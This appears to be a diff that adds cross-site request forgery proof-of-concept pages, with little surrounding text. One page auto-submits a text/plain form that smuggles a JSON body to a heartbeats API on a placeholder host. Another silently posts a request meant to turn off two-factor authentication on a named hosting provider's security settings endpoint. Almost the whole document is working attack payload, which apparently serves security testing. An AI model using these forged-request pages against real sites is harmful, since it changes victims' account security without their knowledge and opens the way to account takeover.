@@ -1,3 +1,12 @@
+ENCTYPE=
+multipart/form-data
+text/plain
+application/x-www-form-urlencoded
+multipart/form-data
+
+
+
+<!-- 1 -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -19,3 +28,60 @@ $(document).ready(function() {
 </form>
 </body>
 </html>
+
+
+
+
+
+<!-- 2 -->
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script>
+$( document ).ready(function() {
+    $("#z").attr("name",'{"entity":"https://zzz.com","type":"domain","time":"'+($.now()/1000)+'","project":"<<LAST_PROJECT>>","is_debugging":false,"plugin":"chrome-wakatime/1.0.2","fakeparam":"');
+    $("#f").submit();
+});
+</script>
+</head>
+<body>
+<form id="f" ENCTYPE="text/plain" action="https://target.com/api/v1/users/current/heartbeats" method="post">
+<input id="z" type="hidden" name='test' value='test"}'> 
+<input type="submit" value="send">
+</form>
+</body>
+</html>
+
+
+
+
+
+
+<!-- 3 -->
+
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script>
+$(document).ready(function() {
+    // Prepare the data as a stringified JSON object
+    var jsonData = JSON.stringify({ "2fa_enabled": false });
+
+    // Set the hidden input field to hold the JSON data
+    $("#z").val(jsonData); // Assign the stringified JSON to the input field
+
+    // Submit the form
+    $("#f").submit();  // Automatically submit the form
+});
+</script>
+</head>
+<body>
+<form id="f" enctype="application/x-www-form-urlencoded" action="https://my.ishosting.com/api/settings/security" method="post">
+    <!-- Hidden input that will hold the JSON data -->
+    <input id="z" type="hidden" name="test" value="">
+    <input type="submit" value="send">
+</form>
+</body>
+</html>
+
